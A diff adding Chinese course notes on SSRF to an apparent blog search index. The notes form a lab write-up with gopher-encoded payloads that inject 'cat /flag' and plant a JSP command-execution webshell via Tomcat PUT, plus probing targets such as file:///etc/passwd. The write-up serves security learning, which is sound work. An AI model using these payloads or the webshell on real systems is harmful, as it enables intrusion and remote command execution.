@@ -3959,4 +3959,530 @@ logindata.Password =encodeURI(encrypt.encrypt(numPassword));
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>buhuo</title>
+    <url>/2026/07/28/buhuo/</url>
+    <content><![CDATA[<p>大佬实力在线，钱包在线，格局更在线！又豪爽又大气，能跟你当队友太幸运了。<br><img src="/images/xx.jpg"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第65天-SSRF服务端伪造&amp;伪协议利玩法&amp;域名及IP绕过&amp;无回显利用&amp;挖掘点</title>
+    <url>/2026/09/10/%E7%AC%AC65%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%8E%A9%E6%B3%95-%E5%9F%9F%E5%90%8D%E5%8F%8AIP%E7%BB%95%E8%BF%87-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8-%E6%8C%96%E6%8E%98%E7%82%B9/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-SSRF利用绕过-伪协议&amp;IP及域名</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SSRF挖掘思路-功能逻辑&amp;SRC复盘</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-1.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-2.png"></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<h1 id="一、SSRF漏洞原理"><a href="#一、SSRF漏洞原理" class="headerlink" title="一、SSRF漏洞原理"></a>一、SSRF漏洞原理</h1><p>服务器端请求伪造，也称为SSRF（Server-SideRequestForgery），是因为前端用户可以输入任意URL到后端服务器，而且服务器也没有对其URL进行严格的过滤和校验，导致攻击者可以构造一些恶意的URL让服务器去访问执行。</p>
+<p>主要安全影响<font style="background-color:#DF2A3F;">（这三点在下面靶场都有体现）</font>：</p>
+<p>1、读取服务器本地文件</p>
+<p>2、探测内网存活主机和开放端口</p>
+<p>3、攻击其他内网服务器及服务</p>
+<h1 id="二、靶场-通过靶场来学习攻击其他内网服务器及服务"><a href="#二、靶场-通过靶场来学习攻击其他内网服务器及服务" class="headerlink" title="二、靶场(通过靶场来学习攻击其他内网服务器及服务)"></a>二、靶场(通过靶场来学习攻击其他内网服务器及服务)</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-3.png"></p>
+<p><a href="https://github.com/sqlsec/ssrf-vuls">https://github.com/sqlsec/ssrf-vuls</a></p>
+<h2 id="1、靶场搭建"><a href="#1、靶场搭建" class="headerlink" title="1、靶场搭建"></a>1、靶场搭建</h2><p>环境：Ubuntu 16.04</p>
+<p>命令：</p>
+<p>1.apt update更新软件源</p>
+<p>2.把靶场ssrf-vul-for-new-main.zip上传到linux</p>
+<p>3.apt install unzip下载解压工具，然后解压压缩包</p>
+<p>4.进入目录apt install docker</p>
+<p>5.再apt install docker-compose</p>
+<p>6.docker-compse up -d启动，发现报错了打开docker-compose.yaml把version3改为version2，再次输入一开始命令即可</p>
+<h2 id="2、靶场内容"><a href="#2、靶场内容" class="headerlink" title="2、靶场内容"></a>2、靶场内容</h2><p>通过读取etc下的hosts文件，知道了内网ip，之后我们可以通过遍历ip来发现探测内网存活主机和开放端口。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-4.png"></p>
+<p>接着我们就可以通过bp来实现，这里就不多赘述了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-5.png"></p>
+<p>然后就找到了很多服务和主机</p>
+<h3 id="1、http-172-150-23-22"><a href="#1、http-172-150-23-22" class="headerlink" title="1、http://172.150.23.22"></a>1、<a href="http://172.150.23.22/">http://172.150.23.22</a></h3><p><a href="http://172.150.23.22/shell.php">http://172.150.23.22/shell.php</a>，通过代码可以看出这里有一个rce</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-6.png"></p>
+<p>那么有人问了你怎么知道这里有shell.php，我们还是用bp找个字典包一下就完事了，简单演示一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-7.png"></p>
+<p>看长度就能发现，这个文件被跑出来了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-8.png"></p>
+<p>拿下！</p>
+<h3 id="2、http-172-150-23-24"><a href="#2、http-172-150-23-24" class="headerlink" title="2、http://172.150.23.24"></a>2、<a href="http://172.150.23.24/">http://172.150.23.24</a></h3><p>这看着也是典型的rce，但是这个我们直接在在这里输入ip是不行的，因为我们是通过一个存在ssrf的网站探测到其他在同一内网的服务，我们必须使用通过存在ssrf的网站去访问其他服务才能通，如果直接在框里输ip和命令，那就是我们主机去访问了，内外网肯定是不通</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-9.png"></p>
+<p>我们的框里只能进行get请求，但是<a href="http://172.150.23.24/">http://172.150.23.24</a>是要post请求，那我们就用用到gopher协议了，先抓一个功能包</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-10.png"></p>
+<p>这里host、origin、Referer都要改成内网的ip，然后accept-encoding删掉，因为一会儿涉及到编码，发包发到decoder进行url二次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST/HTTP/1.1</span><br><span class="line">Host:172.150.23.24</span><br><span class="line">User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:136.0)Gecko/20100101Firefox/136.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:26</span><br><span class="line">Origin:http://172.150.23.24</span><br><span class="line">Connection:close</span><br><span class="line">Referer:http://172.150.23.24/</span><br><span class="line">Cookie:timezone=8</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line"></span><br><span class="line">ip=127.0.0.1%3Bcat+%2Fflag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 172.150.23.24</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4612</span><br><span class="line">Origin: http://172.150.23.24</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://172.150.23.24/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">url=gopher://172.150.23.24:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%37%32%25%37%36%25%33%61%25%33%31%25%33%35%25%33%34%25%32%65%25%33%30%25%32%39%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%66%25%33%32%25%33%30%25%33%31%25%33%30%25%33%30%25%33%31%25%33%30%25%33%31%25%32%30%25%34%36%25%36%39%25%37%32%25%36%35%25%36%36%25%36%66%25%37%38%25%32%66%25%33%31%25%33%35%25%33%34%25%32%65%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%37%61%25%36%38%25%32%64%25%35%34%25%35%37%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%37%61%25%36%38%25%32%64%25%34%38%25%34%62%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%32%63%25%36%35%25%36%65%25%32%64%25%35%35%25%35%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%36%25%32%63%25%36%35%25%36%65%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%36%25%30%64%25%30%61%25%34%66%25%37%32%25%36%39%25%36%37%25%36%39%25%36%65%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%32%66%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%30%25%37%32%25%36%39%25%36%66%25%37%32%25%36%39%25%37%34%25%37%39%25%33%61%25%32%30%25%37%35%25%33%64%25%33%30%25%32%63%25%32%30%25%36%39%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%32%35%25%33%33%25%34%32%25%36%33%25%36%31%25%37%34%25%32%62%25%32%35%25%33%32%25%34%36%25%36%36%25%36%63%25%36%31%25%36%37</span><br></pre></td></tr></table></figure>
+
+<p>结果出现flag，拿下！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-11.png"></p>
+<p>#SSRF漏洞挖掘</p>
+<p>黑盒探针：</p>
+<p>-业务功能点</p>
+<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
+<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3.在线翻译：给网址翻译对应网页的内容</p>
+<p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
+<p>9.邮件系统：比如接收邮件服务器地址</p>
+<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>-URL关键参数</p>
+<p>share</p>
+<p>wap</p>
+<p>url</p>
+<p>link</p>
+<p>src</p>
+<p>source</p>
+<p>target</p>
+<p>u</p>
+<p>display</p>
+<p>sourceURl</p>
+<p>imageURL</p>
+<p>domain</p>
+<p>白盒分析：见代码审计（文件读取，加载，数据操作类的函数）</p>
+<h3 id="3、http-172-150-23-26-8080"><a href="#3、http-172-150-23-26-8080" class="headerlink" title="3、http://172.150.23.26:8080"></a>3、<a href="http://172.150.23.26:8080/">http://172.150.23.26:8080</a></h3><p>这个网站下有一个tomcat的网站，这里利用需要给服务器发一个put包，所以这里还是需要需要利用gopher去发包，这里只用来理解ssrf具体这个漏洞这里不用管。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-12.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 172.150.23.26:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 460</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(command != null)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 8.217.100.43:9080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6315</span><br><span class="line">Origin: http://8.217.100.43:9080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8.217.100.43:9080/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">url=gopher://172.150.23.26:8080/_%25%35%30%25%35%35%25%35%34%25%32%30%25%32%66%25%33%31%25%32%65%25%36%61%25%37%33%25%37%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%36%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%32%61%25%32%66%25%32%61%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%36%35%25%36%65%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%36%33%25%36%66%25%36%64%25%37%30%25%36%31%25%37%34%25%36%39%25%36%32%25%36%63%25%36%35%25%33%62%25%32%30%25%34%64%25%35%33%25%34%39%25%34%35%25%32%30%25%33%39%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%36%25%32%65%25%33%31%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%35%34%25%37%32%25%36%39%25%36%34%25%36%35%25%36%65%25%37%34%25%32%66%25%33%35%25%32%65%25%33%30%25%32%39%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%34%25%33%36%25%33%30%25%30%61%25%30%61%25%33%63%25%32%35%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%30%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%33%64%25%32%30%25%37%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%32%65%25%36%37%25%36%35%25%37%34%25%35%30%25%36%31%25%37%32%25%36%31%25%36%64%25%36%35%25%37%34%25%36%35%25%37%32%25%32%38%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%36%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%32%31%25%33%64%25%32%30%25%36%65%25%37%35%25%36%63%25%36%63%25%32%39%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%61%25%36%31%25%37%36%25%36%31%25%32%65%25%36%39%25%36%66%25%32%65%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%30%25%36%39%25%36%65%25%33%64%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%65%25%36%37%25%36%35%25%37%34%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%38%25%32%39%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%38%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%65%25%37%34%25%32%30%25%36%31%25%32%30%25%33%64%25%32%30%25%32%64%25%33%31%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%35%64%25%32%30%25%36%32%25%32%30%25%33%64%25%32%30%25%36%65%25%36%35%25%37%37%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%33%32%25%33%30%25%33%34%25%33%38%25%35%64%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%37%25%36%38%25%36%39%25%36%63%25%36%35%25%32%38%25%32%38%25%36%31%25%33%64%25%36%39%25%36%65%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%36%32%25%32%39%25%32%39%25%32%31%25%33%64%25%32%64%25%33%31%25%32%39%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%36%63%25%36%65%25%32%38%25%36%65%25%36%35%25%37%37%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%36%32%25%32%39%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%32%66%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%32%30%25%36%35%25%36%63%25%37%33%25%36%35%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%36%36%25%36%66%25%37%32%25%36%64%25%36%31%25%37%34%25%33%61%25%32%30%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%33%66%25%36%33%25%36%64%25%36%34%25%33%64%25%34%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%32%25%32%39%25%33%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%61%25%32%35%25%33%65%25%30%61</span><br></pre></td></tr></table></figure>
+
+<p>原本目录下是没有1.jsp的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-14.png"></p>
+<p>发包后产生了1.jsp然后rce，拿下!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-15.png"></p>
+<p><font style="background-color:#DF2A3F;">还有很多关卡，但是这节课就是为了让理解ssrf，这几关足够了</font></p>
+<h1 id="三、SSRF伪协议利用"><a href="#三、SSRF伪协议利用" class="headerlink" title="三、SSRF伪协议利用"></a>三、SSRF伪协议利用</h1><p><a href="http://web常见访问,如http//127.0.0.1">http://Web常见访问，如http://127.0.0.1</a></p>
+<p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+<p>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
+<p>s<a href="ftp://ssh文件传输协议或安全文件传输协议/">ftp://SSH文件传输协议或安全文件传输协议</a></p>
+<p>ldap:&#x2F;&#x2F; 轻量级目录访问协议</p>
+<p>tftp:&#x2F;&#x2F; 简单文件传输协议</p>
+<p>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p>
+<p>由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）,<font style="background-color:#FBDE28;">格式：gopher:&#x2F;&#x2F;ip:port&#x2F;_， Gopherus工具的主要作用是在遇到SSRF漏洞时，能够生成对应的Gopher协议Payload，使得攻击者可以利用这种协议的特点对内网进行探测和利用。  </font></p>
+<p><font style="background-color:#ED740C;">应用：漏洞利用或信息收集 通讯相关服务的时候 工具：Gopherus</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-16.png"></p>
+<h1 id="四、SSRF漏洞挖掘"><a href="#四、SSRF漏洞挖掘" class="headerlink" title="四、SSRF漏洞挖掘"></a>四、SSRF漏洞挖掘</h1><p>黑盒探针：</p>
+<p>业务功能点</p>
+<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
+<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3.在线翻译：给网址翻译对应网页的内容</p>
+<p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
+<p>9.邮件系统：比如接收邮件服务器地址</p>
+<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>-URL关键参数</p>
+<p>share</p>
+<p>wap</p>
+<p>url</p>
+<p>link</p>
+<p>src</p>
+<p>source</p>
+<p>target</p>
+<p>u</p>
+<p>display</p>
+<p>sourceURl</p>
+<p>imageURL</p>
+<p>domain</p>
